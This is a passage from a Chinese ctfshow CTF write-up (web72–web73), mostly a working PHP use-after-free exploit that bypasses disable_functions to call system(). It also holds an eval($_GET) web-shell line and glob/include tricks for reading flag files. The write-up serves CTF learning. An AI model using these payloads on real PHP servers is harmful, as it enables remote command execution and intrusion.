class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>UseAfterFree disable function</p><blockquote><p><a href="https://blog.csdn.net/qq_62414126/article/details/124062044">https://blog.csdn.net/qq_62414126/article/details/124062044</a></p></blockquote><h2 id="为什么在使用eval-函数有时候需要添加-gt"><a href="#为什么在使用eval-函数有时候需要添加-gt" class="headerlink" title="为什么在使用eval()函数有时候需要添加?&gt;"></a>为什么在使用eval()函数有时候需要添加?&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[1]); #如果我们通过&lt;?=`ls`;去执行的话需要在前面添加?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079308-e8ea37f7-98ed-4c6d-bb24-97c1fc8eae1e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079316-0676564d-ce6c-485f-b4a4-0e97d778430d.png" alt="image.png"><br>原因是eval()函数相当于执行php的代码，而<?= 就相当于<?php echo在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的<?php给闭合，不然不会执行。闭合之后就相当于<?php ?> &lt;?=<code>ls</code>;</p><h1 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h1><p>先查看一下文件列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223723167-df56bcb3-9699-4868-b367-3d8a06f49f82.png" alt="image.png"><br>flag文件在flagc.txt里面。<br>实际上，这道题可以直接使用include来读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>但是看了b站的视频发现是想要用上一道题的payload，但是交了之后发现提示说strlen函数被禁用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223844662-48c977ec-a595-46e3-b89b-ecf337552378.png" alt="image.png"><br>然后他的想法是将禁用的strlen函数给重写。<br>那么直接简单重写即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strlen 返回字符串长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$length</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改上一道题的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span 